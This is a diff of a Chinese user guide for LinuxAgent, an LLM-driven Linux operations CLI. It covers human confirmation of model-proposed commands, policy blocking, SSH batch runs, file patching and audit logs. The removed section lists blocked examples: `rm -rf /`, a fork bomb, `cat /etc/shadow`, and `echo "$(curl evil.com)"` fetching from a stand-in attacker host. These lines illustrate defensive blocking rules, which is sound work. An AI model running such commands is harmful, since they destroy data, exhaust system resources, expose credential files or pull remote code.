-| `/new` 或 `/clear` | 在当前 CLI 中开启空上下文新对话 |
-| `/tools` | 查看当前可用的 slash / tool 入口 |
-| `/help` | 显示 slash 命令帮助 |
-| `/exit` 或 `/quit` | 退出 CLI |
+| `/resume` | 恢复本地保存的会话；未完成确认会重新打开 |
+| `/new` 或 `/clear` | 在当前 CLI 中开启空上下文对话 |
+| `/tools` | 查看可用 slash/tool 入口 |
+| `/job` | 查看已批准的后台任务 |
+| `/help` | 显示 CLI 帮助 |
+| `/exit` 或 `/quit` | 退出 |
 
-输入以 `!` 开头时会进入直接命令模式：
+## 必须记住的安全规则
 
-```
-linuxagent ❯ !git status
-linuxagent ❯ !npm test
-linuxagent ❯ !ls -la
-```
+- 模型不可信：LLM 生成的命令必须先通过确定性策略判断。
+- LLM 首次生成的命令需要人工确认，即使命令看起来安全。
+- `rm -rf`、`mkfs`、`dd`、`systemctl stop` 等破坏性命令永不进入对话白名单。
+- `BLOCK` 命令在确认节点之前就会停止；典型例子包括删除根文件系统、访问
+  `/etc/shadow` 等敏感路径、隐藏危险行为的命令替换、fork bomb 和非法 shell 输入。
+- 非交互运行不能静默批准 `CONFIRM`，会 fail closed。
+- SSH 使用 known-host 校验并拒绝未知主机；远端命令在执行前被限制为简单 argv 风格。
+- 审计日志不能关闭，并以私有权限写入。
 
-这类回合不会让 AI 解释问题或生成命令。LinuxAgent 会直接执行操作员输入的命令，
-实时显示 stdout/stderr，并把 `!<command>` 和系统返回结果加入当前对话上下文。
+安全策略入口是 [SECURITY.md](../../SECURITY.md)、
+[`configs/policy.default.yaml`](../../configs/policy.default.yaml) 和
+`src/linuxagent/policy/`。
 
-### 文件生成与修改
+## 常用场景
 
-当你要求“新建脚本”“写一个 Python/Go 程序”“修改配置文件”或“在已有文件里补功能”时，
-LinuxAgent 不会直接让模型拼 shell 命令覆盖文件，而是进入文件 patch 流程：
+### 安全巡检
 
-1. planner 可先调用只读工具探测环境和文件内容：`get_system_info`、`list_dir`、
-   `read_file(path, offset, limit)`、`search_files(pattern, root)`、
-   `search_logs(pattern, log_file)`；搜索 pattern 按普通文本处理，不执行正则。
-2. 每个暴露给 LLM 的工具都会携带 sandbox metadata，显式声明
-   `read_files`、`write_files`、`execute_commands`、`system_inspect`、
-   `network_access` 和 `hitl` mode。
-3. 直接的 `execute_command` 工具默认不进入 LLM tool catalog。命令规划与执行应走
-   主 HITL graph。只有设置 `sandbox.tools.enable_execute_command=true` 后才会显式
-   开启；即使开启，该工具仍拒绝 CONFIRM 和 BLOCK 命令，只执行 policy 判定为
-   SAFE 的命令。
-4. 工具调用受 `sandbox.tools` 统一约束：单次调用超时、单工具输出上限、单次请求
-   累计输出预算和最大 tool-calling 轮数。工具异常、超时、截断、拒绝执行，以及历史里
-   未配对的 dangling tool call，都会以结构化且已脱敏的 tool result 返回给模型，
-   不把原始 provider 错误直接抛出。
-5. Tool runtime event 属于 runtime/telemetry event，不改变命令审计日志 schema。
-   事件包含 tool 名称、sandbox profile、权限摘要、状态、输出长度，以及已脱敏的
-   args/output preview；完整工具输出不会写入 telemetry attributes。
-6. 终端会显示可观测状态，例如 `LinuxAgent 正在读取文件 /tmp/disk_info.sh`；
-   工具完成后还会展示简短 evidence，例如带行号的 `read_file` 片段或
-   `search_files` 匹配结果。若 planner 判断无需修改文件，最终回答会附带引用依据，
-   让操作员能看到模型基于哪些文件行或搜索结果做判断。工具失败也会显示清晰原因。
-7. 模型必须返回结构化 `FilePatchPlan`，包含 `request_intent`、目标文件、
-   unified diff、风险说明、验证命令和可选权限变更。
-8. 写入前会弹出 diff 确认面板，显示每个文件的 `+N / -M` 统计、紧凑代码片段、
-   高风险路径、权限位变更和验证命令。
-9. 小 diff 已完整显示时不会再次询问展开；大 diff 会分页，只在存在隐藏页时询问是否继续查看。
-10. 多文件 patch 支持逐文件确认，用户可以只接受部分文件。
-
-确认后，LinuxAgent 会用事务方式应用 patch：先在读取文件内容前校验目标路径，拒绝
-symlink 路径组件、hardlink、目录、设备文件、FIFO、socket、超大目标和非 UTF-8 文本；
-写入通过临时文件和原子替换完成。已有目标会备份到本地 `.linuxagent-patch-*` sandbox
-目录；如果后续文件写入或权限变更失败，会自动回滚文件内容和权限位。审计记录会包含
-修改文件、权限变更、备份路径哈希、回滚结果和 sandbox root。
-
-默认只允许 patch 当前工作区和 `/tmp`，由 `file_patch.allow_roots` 控制。`/etc`、
-`/root/.ssh`、`/home/*/.ssh` 等路径会以高风险方式提示。若用户语义是“新建”，
-但目标文件已存在，planner 应选择新文件名、说明无需修改，或转为明确的冲突确认；
-已有功能已实现时应返回无需修改，而不是重写无关代码。
-
-### 场景 1：安全命令（SAFE 路径）
-
-```
-linuxagent ❯ 看一下当前目录的文件
-
-[模型提议] ls -la
-
-╭──── Human confirmation required ────╮
-│ Command  ls -la                     │
-│ Safety   CONFIRM                    │
-│ Rule     LLM_FIRST_RUN              │
-│ Source   llm                        │
-│ Sandbox  profile=system_inspect     │
-│          runner=noop runtime=no_isolation enforced=no │
-│ Network  inherit                    │
-╰──────────────────────────────────────╯
-Allow this operation?
-❯ 1. 接受 / Yes
-  2. 接受，本对话/恢复中不再询问 / Yes, don't ask again
-  3. 不接受 / No
-
-fallback prompt 也会显示并接受 `[y]`、`[a]`、`[n]` 快捷键。多步骤任务运行时，
-临时状态栏会保留当前任务计划，后续命令执行 activity 不会覆盖这份列表。
-
-[执行输出]
-total 52
-drwxr-xr-x  12 user user 4096 ...
-...
-
-[分析]
-当前目录有 12 个子目录和若干文件，权限均为 755 或 644，所有者是 user。
+```text
+linuxagent > 看一下当前目录的文件
+LLM proposes: ls -la
+Safety: CONFIRM, Rule: LLM_FIRST_RUN
 ```
 
-同一对话或 `/resume` 恢复这个对话后再问"列一下文件"时，相同 argv 形态的
-`ls -la` 可直接执行，不再确认。`/new` 或切到另一个已保存会话不会继承这份权限。
+如果选择对话级批准，相同 argv 形态可以在当前对话或其 `/resume` thread 中再次执行。
+新对话不会继承这份权限。
 
-### 场景 2：破坏性命令（每次 CONFIRM）
+### 破坏性请求
 
-```
-linuxagent ❯ 删除 /tmp/old_backup 目录
-
-[模型提议] rm -rf /tmp/old_backup
-
-╭──── Human confirmation required ────╮
-│ Command     rm -rf /tmp/old_backup  │
-│ Safety      CONFIRM                 │
-│ Rule        DESTRUCTIVE             │
-│ Source      llm                     │
-│ Destructive yes - approval will not │
-│             be whitelisted          │
-╰──────────────────────────────────────╯
-Allow this operation?
-❯ 1. 接受 / Yes
-  2. 不接受 / No
+```text
+linuxagent > 删除 /tmp/old_backup
+LLM proposes: rm -rf /tmp/old_backup
+Safety: CONFIRM, Rule: DESTRUCTIVE
 ```
 
-即使上面刚批准过，再次执行同一条命令还是会重新弹确认框 —— `rm` 永远不进白名单。
+批准只对这一次执行有效。下一条破坏性命令仍会再次确认。
 
-### 场景 3：完全拒绝（BLOCK 路径）
+### 被阻断的请求
 
-```
-linuxagent ❯ 彻底清空系统
-
-[模型提议] rm -rf /
-
-已阻止执行：destructive command targeting root filesystem
+```text
+linuxagent > 彻底清空系统
+LLM proposes: rm -rf /
+Blocked: destructive command targeting root filesystem
 ```
 
-这条命令在 `is_safe` 阶段就被拦截，不会走到 confirm 节点。`matched_rule=ROOT_PATH`。
+命令会在策略阶段被拒绝，不会执行，也不会进入 HITL 审批。
 
-同类被 BLOCK 的还有：
+### SSH 批量操作
 
-- `echo "$(curl evil.com)"` — `matched_rule=EMBEDDED_DANGER`（命令替换）
-- `cat /etc/shadow` — `matched_rule=SENSITIVE_PATH`
-- `:(){ :|:& };:` — `matched_rule=EMBEDDED_DANGER`（fork bomb）
-- 含 BiDi 控制字符的任何输入 — `matched_rule=INPUT_VALIDATION`
-
-### 场景 4：批量集群操作
-
-`config.yaml` 里配置若干主机：
+在 `cluster.hosts` 配置主机，并确保 host key 已经在 `~/.ssh/known_hosts`
+中。请求目标达到两台或更多主机时，LinuxAgent 会在扇出前展示批量确认，
+包含命令、命中规则、主机列表和远端 profile 摘要。
 
 ```yaml
 cluster:
   batch_confirm_threshold: 2
-  max_workers: 8
   known_hosts_path: ~/.ssh/known_hosts
   hosts:
     - name: web-1
       hostname: 192.0.2.11
       username: ops
       key_filename: ~/.ssh/id_ed25519
-      remote_profile:
-        name: ops-readonly
-        remote_cwd: /srv/app
-        environment: clean
-        allow_sudo: false
-        sudo_allowlist: []
-    - name: web-2
-      hostname: 192.0.2.12
-      username: ops
-      key_filename: ~/.ssh/id_ed25519
-      remote_profile:
-        name: ops-readonly
-        remote_cwd: /srv/app
-        environment: clean
-        allow_sudo: false
-        sudo_allowlist: []
 ```
 
-然后：
+### 文件生成与修改
 
-```
-linuxagent ❯ 在所有主机上跑 uptime
+当你要求“新建脚本”或“修改配置”时，LinuxAgent 使用结构化 file patch
+流程，而不是让模型通过 shell 重定向覆盖文件。planner 可以先用只读工具检查允许范围内的文件，
+再返回包含目标文件、unified diff、风险说明和验证命令的 `FilePatchPlan`。
+写入前会展示 diff；批准后的 patch 会事务化应用。完整说明见
+[操作员安全模型](operator-safety.md)。
 
-[模型提议] uptime  (on: web-1, web-2)
+### 中断与恢复
 
-╭──── Human confirmation required ────╮
-│ Command     uptime                  │
-│ Safety      CONFIRM                 │
-│ Rule        BATCH_CONFIRM           │
-│ Batch hosts web-1, web-2            │
-│ Remote profiles web-1: profile=ops-readonly user=ops cwd=/srv/app env=clean no sudo │
-╰──────────────────────────────────────╯
-Allow this operation?
-❯ 1. 接受 / Yes
-  2. 不接受 / No
-
-[web-1] exit_code=0
-[web-1] stdout:  10:23:11 up 14 days,  3:02,  2 users,  load average: 0.12, 0.08, 0.06
-[web-2] exit_code=0
-[web-2] stdout:  10:23:12 up  8 days,  9:41,  1 user,   load average: 0.04, 0.05, 0.05
-```
-
-### 场景 5：中断与恢复
-
-未完成的 `confirm` 节点会以 `0o600` 权限写入 `ui.checkpoint_path`。
-重启 CLI 后输入 `/resume`，选择对应会话，LinuxAgent 会按原 `thread_id`
-重新打开未完成的确认流程。
-
-### 示例自然语言输入
-
-- `查看 /var 的磁盘占用`
-- `检查 nginx 服务状态`
-- `在日志里找 ssh 登录失败记录`
-- `谁还在占用 8080 端口`
-- `看看 systemd 启动时间`
-- `在所有主机上检查磁盘剩余空间`
-
----
+未完成的确认节点会以私有权限保存。重启 CLI 后运行 `/resume`，选择对应会话，
+LinuxAgent 会按同一 thread 重新打开未完成的审批。
 
 ## 审计日志
 
-每次 HITL 事件以一行 hash-chained JSON 追加到 `~/.linuxagent/audit.log`：
+HITL 决策、执行、拒绝和相关元数据会以 hash-chained JSONL 追加到
+`~/.linuxagent/audit.log`，权限为 `0o600`。
 
-```json
-{"ts": "2026-04-24T10:23:10.123+08:00", "event": "confirm_begin",
- "audit_id": "a1b2c3", "command": "uptime", "safety_level": "CONFIRM",
- "matched_rule": "BATCH_CONFIRM", "command_source": "llm",
- "trace_id": "t1", "batch_hosts": ["web-1", "web-2"],
- "prev_hash": "0000...", "hash": "9f86..."}
-{"ts": "2026-04-24T10:23:14.456+08:00", "event": "confirm_decision",
- "audit_id": "a1b2c3", "decision": "yes", "latency_ms": 4333,
- "trace_id": "t1", "prev_hash": "9f86...", "hash": "3a6e..."}
-{"ts": "2026-04-24T10:23:15.890+08:00", "event": "command_executed",
- "audit_id": "a1b2c3", "command": "uptime", "exit_code": 0,
- "duration_ms": 187, "trace_id": "t1", "batch_hosts": ["web-1", "web-2"],
- "prev_hash": "3a6e...", "hash": "b4c1..."}
-```
-
-校验完整性：
+常用只读命令：
 
 ```bash
 linuxagent audit verify
-```
-
-查看脱敏后的运维摘要：
-
-```bash
 linuxagent audit summary
 linuxagent audit inspect --limit 10
 linuxagent audit inspect --show-commands
 ```
 
-`summary` 和 `inspect` 都是只读命令，会展示时间范围、命令级决策数量、
-`yes` / `no` / `timeout` / `non_tty_auto_deny` 统计、`SAFE` / `CONFIRM` /
-`BLOCK` 统计和 hash-chain 状态。近期命令明细默认只展示命令 hash；
-只有显式传入 `--show-commands` 时才会在现有 redaction 规则处理后展示命令文本。
+`inspect` 默认脱敏命令明细。只有显式传入 `--show-commands` 时，才会在现有脱敏规则处理后打印命令文本。
 
-常用事后复盘：
+## 本地记忆与语言
 
-```bash
-# 所有被批准的操作
-jq 'select(.event=="confirm_decision" and .decision=="yes")' ~/.linuxagent/audit.log
+本地文件系统记忆只是 advisory context，不是安全边界。它不能降低策略决策、
+跳过 HITL、改变 sandbox enforcement、执行命令或修改审计记录。完全关闭记忆读写：
 
-# 按 audit_id 串出某次操作完整链路
-jq 'select(.audit_id=="a1b2c3")' ~/.linuxagent/audit.log
-
-# 按 trace_id 串出一次图执行链路
-jq 'select(.trace_id=="t1")' ~/.linuxagent/audit.log
-
-# 近 1 小时被拒绝的
-jq 'select(.event=="confirm_decision" and .decision!="yes")' ~/.linuxagent/audit.log
+```yaml
+memory:
+  enabled: false
 ```
 
----
+LinuxAgent 自有固定 UI 文案的运行时语言可在顶层设置：
+
+```yaml
+language: zh-CN  # zh-CN | en-US
+```
+
+该设置不会翻译命令输出、prompt 模板、审计字段名、tool 名称、policy rule id 或模型生成的回答。
+
+## 下一步阅读
+
+| 需求 | 链接 |
+|---|---|
+| Provider 配置 | [Provider 兼容矩阵](provider-matrix.md) |
+| 操作员安全模型 | [操作员安全模型](operator-safety.md) |
+| 威胁模型 | [威胁模型](threat-model.md) |
+| 生产检查清单 | [生产就绪清单](production-readiness.md) |
+| 红队用例 | [红队基线](../en/red-team.md) |
+| 开发流程 | [开发指南](development.md) |
+| 发布流程 | [发布指南](release.md) |
+| v4.1 发布说明 | [v4.1.0](releases/v4.1.0.md) |
+| 英文手册 | [English](../en/README.md) |
 
 ## 常见问题
 
-**Q：`linuxagent check` 报 `must have permissions 0600`？**
-A：R-SEC-04 强制用户配置必须是 `0o600` + 当前用户所有。运行 `chmod 600 ~/.config/linuxagent/config.yaml`。
+**`linuxagent check` 提示配置必须是 `0600`。**
+运行 `chmod 600 ~/.config/linuxagent/config.yaml`，并确认文件属于当前用户。
 
-**Q：`linuxagent chat` 报 `api.api_key is required`？**
-A：在当前生效配置的 `api.api_key` 填入真实 key。bootstrap 后通常是 `LINUXAGENT_CONFIG` 指向的文件；如果工作区要用自己的配置，请使用 `--config ./config.yaml`，或修改/取消 `LINUXAGENT_CONFIG`。
+**提示 `api.api_key is required`。**
+在当前生效配置中设置 `api.api_key`。bootstrap 后通常是 `LINUXAGENT_CONFIG`
+指向的文件；如果某个工作区要用单独配置，请使用 `--config ./config.yaml`。
 
-**Q：为什么我的命令被 BLOCK？**
-A：看 stderr 里的 `matched_rule`：
+**`--yes` 可以跳过所有确认吗？**
+不可以。命令级 `CONFIRM` 和 `BLOCK` 是安全边界。非交互上下文会自动拒绝确认，
+而不是自动批准。
 
-- `EMBEDDED_DANGER`：原始字符串扫出危险模式（常见于 LLM 在 echo 字符串里夹带）
-- `SENSITIVE_PATH`：触及 `/etc/shadow` / `/boot` 等
-- `ROOT_PATH`：目标是根文件系统
-- `INPUT_VALIDATION`：长度 / NUL / BiDi 控制字符
-- `PARSE_ERROR`：shlex 无法解析
+## 许可证
 
-**Q：`--yes` / `--no-confirm` 能跳过所有确认吗？**
-A：按设计不允许。`--yes` 只会降级对话级确认，命令级 CONFIRM / BLOCK 不受影响。非交互脚本调用会遇到 `non_tty_auto_deny`。
-
-**Q：审计日志可以关吗？**
-A：不能。`AuditConfig` 只有 `path` 字段，没有 `enabled`。
-
-**Q：想让 LinuxAgent 在一个没有 `known_hosts` 的新环境里 SSH？**
-A：先登记 host key，例如 `ssh-keyscan -H your-host.example.com >> ~/.ssh/known_hosts`。LinuxAgent 始终拒绝未知 SSH 主机密钥。
-
-**Q：本地 sandbox 会保护远端 SSH 命令吗？**
-A：不会。请用 `cluster.hosts[].remote_profile` 明确远端 cwd、clean environment 和 sudo allowlist，并使用低权限 SSH 用户和预登记 host key。
-
-**Q：可以用自己的 OpenAI 兼容网关吗？**
-A：可以。设置 `api.provider: openai_compatible`，把 `api.base_url` 换成网关地址，`api.model` 换成它支持的模型名。`glm` / `qwen` / `kimi` / `minimax` / `gemini` / `hunyuan` 也走同一条 OpenAI-compatible 路径。本地部署可用 `ollama`、`vllm`、`lmstudio` 或 `local`，并把 `api.api_key` 留空。如果网关不接受 `max_completion_tokens`，设置 `api.token_parameter: max_tokens`。
-
-**Q：可以用 Anthropic 兼容网关吗？**
-A：可以。安装 Anthropic extra 后，设置 `api.provider: anthropic_compatible`、`api.base_url`、`api.model` 和 `api.api_key`。小米 MiMo 可用 `api.provider: xiaomi_mimo`。
-
----
-
-## 开发
-
-```bash
-make install   # pip install -e ".[dev]"
-make test      # pytest + 80% fail-under
-make integration  # 可选集成测试
-make optional-anthropic  # 可选 Anthropic extra 兼容验证
-make lint      # ruff check
-make type      # mypy --strict
-make security  # 红线 grep + bandit
-make red-team  # 对抗式 command-policy 语料
-make sandbox   # sandbox 边界回归测试
-make harness   # YAML 场景 harness
-make build     # wheel + sdist
-make verify-build  # build + wheel 安装 + package data 检查
-make ts-check  # 实验 TypeScript workspace 门禁
-make ts-parity # 实验 TS/Python parity runner
-linuxagent audit verify
-```
-
-更多细节见 [开发指南](development.md)。实验 TypeScript v5 重写线见
-[TypeScript v5 实验内核](typescript-v5.md)；它还不会替代 Python v4 生产运行时。
-
-The TypeScript runtime is experimental. Python v4 remains the default release runtime until parity gates pass.
-
----
-
-## 发布
-
-```bash
-make harness
-make integration  # 可选，本地环境允许时运行
-make sandbox
-make verify-build
-git tag v4.1.0
-git push origin v4.1.0     # 触发 release.yml
-```
-
-详见 [发布指南](release.md)。
-
----
-
-## 文档
-
-- [快速开始](../en/quickstart.md)
-- [TypeScript v5 实验内核](typescript-v5.md) / [TypeScript v5 Experimental Kernel](../en/typescript-v5.md)
-- [Provider 兼容矩阵](provider-matrix.md) / [Provider Matrix](../en/provider-matrix.md)
-- [操作员安全模型](operator-safety.md) / [Operator Safety Model](../en/operator-safety.md)
-- [开发指南](development.md)
-- [发布指南](release.md) / [Release Guide](../en/release.md)
-- [v3 到 v4.0.0 迁移指南（中文）](migration-v3-to-v4.md)
-- [威胁模型（中文）](threat-model.md)
-- [生产就绪清单（中文）](production-readiness.md)
-- [Roadmap](../../ROADMAP.md)
-- [Release Notes](../releases/v4.1.0.md) / [发布说明](releases/v4.1.0.md)
-- [更新日志](CHANGELOG.md) / [Changelog](../../CHANGELOG.md)
-- [安全政策](SECURITY.md) / [Security Policy](../../SECURITY.md)
-- [贡献指南](CONTRIBUTING.md) / [Contributing](../../CONTRIBUTING.md)
-- [行为准则](CODE_OF_CONDUCT.md) / [Code of Conduct](../../CODE_OF_CONDUCT.md)
-
----
-
-## License
-
-MIT
+本项目使用 MIT License。
